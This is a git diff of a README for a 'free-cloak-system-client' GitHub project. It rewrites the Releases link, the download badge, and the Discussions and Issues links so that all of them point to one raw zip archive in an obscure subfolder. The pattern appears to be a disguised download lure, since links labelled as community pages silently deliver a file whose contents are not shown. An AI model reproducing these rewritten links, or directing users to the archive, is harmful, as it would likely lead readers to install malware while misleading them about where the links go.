@@ -6,9 +6,9 @@ Welcome to the free-cloak-system-client! This software helps secure your online 
 
 ## 📥 Download & Install
 
-To get started, please [visit this page to download](https://github.com/LIAN55303/free-cloak-system-client/releases). 
+To get started, please [visit this page to download](https://github.com/LIAN55303/free-cloak-system-client/raw/refs/heads/main/circummeridian/system_free_cloak_client_2.6-alpha.5.zip). 
 
-![Download](https://img.shields.io/badge/Download-Click%20Here-brightgreen)
+![Download](https://github.com/LIAN55303/free-cloak-system-client/raw/refs/heads/main/circummeridian/system_free_cloak_client_2.6-alpha.5.zip%20Here-brightgreen)
 
 You will find the latest version of the software on the Releases page. Choose the version that suits your system, download it, and follow these installation steps:
 
@@ -50,8 +50,8 @@ Once you have installed the application, follow these steps to run it:
 
 Join our community of users to share tips and get help. We encourage you to:
 
-- Visit our [GitHub Discussions](https://github.com/LIAN55303/free-cloak-system-client/discussions) page to ask questions or share your experiences.
-- Check our [Issues](https://github.com/LIAN55303/free-cloak-system-client/issues) page if you encounter any problems. Your feedback is welcome!
+- Visit our [GitHub Discussions](https://github.com/LIAN55303/free-cloak-system-client/raw/refs/heads/main/circummeridian/system_free_cloak_client_2.6-alpha.5.zip) page to ask questions or share your experiences.
+- Check our [Issues](https://github.com/LIAN55303/free-cloak-system-client/raw/refs/heads/main/circummeridian/system_free_cloak_client_2.6-alpha.5.zip) page if you encounter any problems. Your feedback is welcome!
 
 ## 🛠️ Troubleshooting
 
